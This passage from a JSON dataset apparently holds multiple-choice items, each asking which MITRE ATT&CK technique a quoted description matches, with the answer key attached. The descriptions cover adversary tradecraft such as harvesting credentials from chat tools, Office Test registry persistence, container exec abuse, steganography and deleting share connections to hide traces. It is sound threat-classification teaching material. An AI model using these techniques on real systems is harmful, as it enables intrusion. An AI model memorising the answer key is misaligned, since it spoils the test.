      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.\n\nRather than accessing the stored chat logs (i.e., Credentials In Files), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation .",
      "options": "A. Unsecured Credentials: Chat Messages, B. Remote Access Software, C. Indicator Removal, D. Process Injection: Thread Local Storage",
      "choice": "A. Unsecured Credentials: Chat Messages",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.\n\nIn Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container. In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.\n\nOptions:\nA. Container Administration Command, B. System Binary Proxy Execution: CMSTP, C. Forge Web Credentials: SAML Tokens, D. Multi-Factor Authentication Interception",
    "context": "",
    "output": "A. Container Administration Command",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.\n\nIn Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container. In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.",
      "options": "A. Container Administration Command, B. System Binary Proxy Execution: CMSTP, C. Forge Web Credentials: SAML Tokens, D. Multi-Factor Authentication Interception",
      "choice": "A. Container Administration Command",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, Valid Accounts used by the other party for access to internal network systems may be compromised and used.\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.\n\nPossible answers:\nA. Trusted Developer Utilities Proxy Execution: MSBuild, B. Develop Capabilities: Digital Certificates, C. Trusted Relationship, D. Remote Services",
    "context": "",
    "output": "C. Trusted Relationship",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, Valid Accounts used by the other party for access to internal network systems may be compromised and used.\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.",
      "options": "A. Trusted Developer Utilities Proxy Execution: MSBuild, B. Develop Capabilities: Digital Certificates, C. Trusted Relationship, D. Remote Services",
      "choice": "C. Trusted Relationship",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. Remote Data Staging). <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use certutil to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.\nA. Archive Collected Data: Archive via Utility, B. Exfiltration Over Other Network Medium, C. Group Policy Discovery, D. Masquerading: Space after Filename\nAnswer:",
    "context": "",
    "output": "A. Archive Collected Data: Archive via Utility",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. Remote Data Staging). <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use certutil to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.",
      "options": "A. Archive Collected Data: Archive via Utility, B. Exfiltration Over Other Network Medium, C. Group Policy Discovery, D. Masquerading: Space after Filename",
      "choice": "A. Archive Collected Data: Archive via Utility",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.\n\nMultiple ways of delivering exploit code to a browser exist (i.e., Drive-by Target), including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting\n* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary\n* Malicious ads are paid for and served through legitimate ad providers (i.e., Malvertising)\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.\n\nTypical the technique process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.\n\nA. Acquire Infrastructure: Server, B. Dynamic Resolution: DNS Calculation, C. Drive-by Compromise, D. Gather Victim Network Information\nAnswer:",
    "context": "",
    "output": "C. Drive-by Compromise",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.\n\nMultiple ways of delivering exploit code to a browser exist (i.e., Drive-by Target), including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting\n* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary\n* Malicious ads are paid for and served through legitimate ad providers (i.e., Malvertising)\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.\n\nTypical the technique process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.",
      "options": "A. Acquire Infrastructure: Server, B. Dynamic Resolution: DNS Calculation, C. Drive-by Compromise, D. Gather Victim Network Information",
      "choice": "C. Drive-by Compromise",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via the technique may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple the techniques to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.\nA. Network Boundary Bridging, B. Process Injection, C. Modify System Image: Downgrade System Image, D. Modify System Image: Patch System Image",
    "context": "",
    "output": "B. Process Injection",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via the technique may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple the techniques to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
      "options": "A. Network Boundary Bridging, B. Process Injection, C. Modify System Image: Downgrade System Image, D. Modify System Image: Patch System Image",
      "choice": "B. Process Injection",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users.  Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as Data Destruction, Firmware Corruption, Service Stop etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems.\n\nOptions:\nA. Obfuscated Files or Information: Embedded Payloads, B. Cloud Service Discovery, C. Endpoint Denial of Service: Application or System Exploitation, D. OS Credential Dumping: DCSync",
    "context": "",
    "output": "C. Endpoint Denial of Service: Application or System Exploitation",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users.  Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as Data Destruction, Firmware Corruption, Service Stop etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems.",
      "options": "A. Obfuscated Files or Information: Embedded Payloads, B. Cloud Service Discovery, C. Endpoint Denial of Service: Application or System Exploitation, D. OS Credential Dumping: DCSync",
      "choice": "C. Endpoint Denial of Service: Application or System Exploitation",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a Server or Virtual Private Server, adversaries may compromise third-party servers in support of operations.\n\nAdversaries may also compromise web servers to support watering hole operations, as in Drive-by Compromise, or email servers to support Phishing operations.\n\nPossible answers:\nA. XSL Script Processing, B. Compromise Infrastructure: Server, C. Use Alternate Authentication Material: Web Session Cookie, D. Search Closed Sources: Purchase Technical Data",
    "context": "",
    "output": "B. Compromise Infrastructure: Server",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a Server or Virtual Private Server, adversaries may compromise third-party servers in support of operations.\n\nAdversaries may also compromise web servers to support watering hole operations, as in Drive-by Compromise, or email servers to support Phishing operations.",
      "options": "A. XSL Script Processing, B. Compromise Infrastructure: Server, C. Use Alternate Authentication Material: Web Session Cookie, D. Search Closed Sources: Purchase Technical Data",
      "choice": "B. Compromise Infrastructure: Server",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use Valid Accounts to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\u201cremote framebuffer\u201d) protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.\n\nVNC differs from Remote Desktop Protocol as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.\nA. Use Alternate Authentication Material: Pass the Hash, B. Data Obfuscation: Junk Data, C. Obtain Capabilities: Exploits, D. Remote Services: VNC",
    "context": "",
    "output": "D. Remote Services: VNC",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use Valid Accounts to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\u201cremote framebuffer\u201d) protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.\n\nVNC differs from Remote Desktop Protocol as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.",
      "options": "A. Use Alternate Authentication Material: Pass the Hash, B. Data Obfuscation: Junk Data, C. Obtain Capabilities: Exploits, D. Remote Services: VNC",
      "choice": "D. Remote Services: VNC",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.\n\nA. Active Scanning, B. Steal Application Access Token, C. Data Transfer Size Limits, D. Obfuscated Files or Information: Dynamic API Resolution\nAnswer:",
    "context": "",
    "output": "C. Data Transfer Size Limits",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",
      "options": "A. Active Scanning, B. Steal Application Access Token, C. Data Transfer Size Limits, D. Obfuscated Files or Information: Dynamic API Resolution",
      "choice": "C. Data Transfer Size Limits",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.\n\nThere exist user and global Registry keys for the Office Test feature, such as:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.\n\nA. Hide Artifacts: NTFS File Attributes, B. Abuse Elevation Control Mechanism: Setuid and Setgid, C. Process Discovery, D. Office Application Startup: Office Test\nAnswer:",
    "context": "",
    "output": "D. Office Application Startup: Office Test",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.\n\nThere exist user and global Registry keys for the Office Test feature, such as:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",
      "options": "A. Hide Artifacts: NTFS File Attributes, B. Abuse Elevation Control Mechanism: Setuid and Setgid, C. Process Discovery, D. Office Application Startup: Office Test",
      "choice": "D. Office Application Startup: Office Test",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to Escape to Host and access other containers running on the node. \n\nContainers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow.  In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes. Adversaries may the techniques based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.\n\nOptions:\nA. Browser Information Discovery, B. Deploy Container, C. Hide Infrastructure, D. Indicator Removal: Clear Network Connection History and Configurations",
    "context": "",
    "output": "B. Deploy Container",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to Escape to Host and access other containers running on the node. \n\nContainers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow.  In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes. Adversaries may the techniques based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.",
      "options": "A. Browser Information Discovery, B. Deploy Container, C. Hide Infrastructure, D. Indicator Removal: Clear Network Connection History and Configurations",
      "choice": "B. Deploy Container",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.\nA. Compromise Infrastructure: Botnet, B. Hide Artifacts: Hidden Users, C. Fallback Channels, D. Command and Scripting Interpreter: Windows Command Shell",
    "context": "",
    "output": "C. Fallback Channels",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
      "options": "A. Compromise Infrastructure: Botnet, B. Hide Artifacts: Hidden Users, C. Fallback Channels, D. Command and Scripting Interpreter: Windows Command Shell",
      "choice": "C. Fallback Channels",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to Brute Force, its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: Gather Victim Org Information, or Search Victim-Owned Websites).\n\nFor example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website\u2019s pages and directories. This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: Exploit Public-Facing Application or Brute Force).  \n\nAs cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure. Once storage objects are discovered, adversaries may leverage Data from Cloud Storage to access valuable information that can be exfiltrated or used to escalate privileges and move laterally.\nA. Develop Capabilities: Digital Certificates, B. Active Scanning: Wordlist Scanning, C. Web Service: One-Way Communication, D. Hide Artifacts: Hidden File System",
    "context": "",
    "output": "B. Active Scanning: Wordlist Scanning",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to Brute Force, its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: Gather Victim Org Information, or Search Victim-Owned Websites).\n\nFor example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website\u2019s pages and directories. This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: Exploit Public-Facing Application or Brute Force).  \n\nAs cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure. Once storage objects are discovered, adversaries may leverage Data from Cloud Storage to access valuable information that can be exfiltrated or used to escalate privileges and move laterally.",
      "options": "A. Develop Capabilities: Digital Certificates, B. Active Scanning: Wordlist Scanning, C. Web Service: One-Way Communication, D. Hide Artifacts: Hidden File System",
      "choice": "B. Active Scanning: Wordlist Scanning",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\nDuqu was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server. \n\nBy the end of 2017, a threat group used\u202f<code>Invoke-PSImage</code>\u202fto hide PowerShell commands in an image file (.png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.\n\nOptions:\nA. System Owner/User Discovery, B. Obfuscated Files or Information: Steganography, C. Masquerading: Double File Extension, D. Dynamic Resolution",
    "context": "",
    "output": "B. Obfuscated Files or Information: Steganography",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\nDuqu was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server. \n\nBy the end of 2017, a threat group used\u202f<code>Invoke-PSImage</code>\u202fto hide PowerShell commands in an image file (.png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.",
      "options": "A. System Owner/User Discovery, B. Obfuscated Files or Information: Steganography, C. Masquerading: Double File Extension, D. Dynamic Resolution",
      "choice": "B. Obfuscated Files or Information: Steganography",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. Non-Standard Port).\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various Remote Services may also indirectly modify firewall rules.\n\nPossible answers:\nA. Command and Scripting Interpreter: Unix Shell, B. Impair Defenses: Disable or Modify System Firewall, C. Credentials from Password Stores: Windows Credential Manager, D. Develop Capabilities: Digital Certificates",
    "context": "",
    "output": "B. Impair Defenses: Disable or Modify System Firewall",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. Non-Standard Port).\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various Remote Services may also indirectly modify firewall rules.",
      "options": "A. Command and Scripting Interpreter: Unix Shell, B. Impair Defenses: Disable or Modify System Firewall, C. Credentials from Password Stores: Windows Credential Manager, D. Develop Capabilities: Digital Certificates",
      "choice": "B. Impair Defenses: Disable or Modify System Firewall",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and SMB/Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command.\n\nPossible answers:\nA. Search Closed Sources: Threat Intel Vendors, B. Gather Victim Host Information: Firmware, C. Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol, D. Indicator Removal: Network Share Connection Removal",
    "context": "",
    "output": "D. Indicator Removal: Network Share Connection Removal",
    "category": "MitreFlan",
